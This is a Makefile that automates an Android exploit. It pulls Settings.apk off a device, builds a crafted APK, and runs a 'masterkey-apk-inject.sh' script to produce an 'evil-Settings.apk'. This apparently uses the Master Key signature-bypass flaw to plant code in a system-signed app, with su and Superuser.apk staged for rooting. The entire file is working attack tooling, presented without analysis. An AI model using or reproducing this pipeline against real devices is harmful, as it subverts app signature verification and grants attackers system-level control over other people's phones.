all: su Superuser.apk evil-Settings.apk

su Superuser.apk:
	@echo "Please download ARM \"$@\" from http://androidsu.com/superuser/ and put it in this directory"

abcd.apk: AndroidManifest.xml
	aapt p -I $(SDK)/platforms/android-8/android.jar -f -F $@ -M $<

Settings.apk:
	adb pull /system/app/Settings.apk

evil-Settings.apk: Settings.apk abcd.apk
	./masterkey-apk-inject.sh Settings.apk abcd.apk

clean:
	rm -f abcd.apk Settings.apk evil-Settings.apk *~
